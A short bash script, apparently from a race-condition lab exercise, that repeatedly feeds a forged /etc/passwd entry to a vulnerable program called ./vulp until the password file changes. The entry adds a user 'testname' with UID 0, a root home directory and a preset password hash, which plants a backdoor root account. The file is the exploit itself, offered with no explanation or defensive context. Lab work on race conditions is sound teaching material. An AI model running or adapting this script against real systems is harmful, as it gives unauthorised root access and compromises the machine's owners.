#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ] 
do
	echo "testname:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp
#	echo "testname:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp3
	new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
